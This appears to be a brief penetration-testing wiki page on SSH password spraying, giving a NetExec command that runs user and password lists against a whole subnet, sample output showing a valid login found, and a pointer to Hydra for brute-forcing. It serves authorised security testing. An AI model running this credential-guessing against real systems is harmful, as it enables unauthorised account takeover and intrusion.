# Password spraying

### Password spraying (without bruteforce)

```bash
nxc ssh $TARGET/24 -u $USERFILE -p $PASSFILE --no-bruteforce
```

Expected Results:

```bash
SSH         127.0.0.1       22     127.0.0.1        [*] SSH-2.0-OpenSSH_8.2p1 Debian-4
SSH         127.0.0.1       22     127.0.0.1        [+] user:password
```

{% hint style="info" %}
By default nxc, will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Useful for spraying a single password against a large user list.
{% endhint %}

You can also use [Hydra](https://github.com/vanhauser-thc/thc-hydra) available by default on Kali to bruteforce SSH passwords, it's faster and better :)

{% embed url="https://github.com/vanhauser-thc/thc-hydra" %}
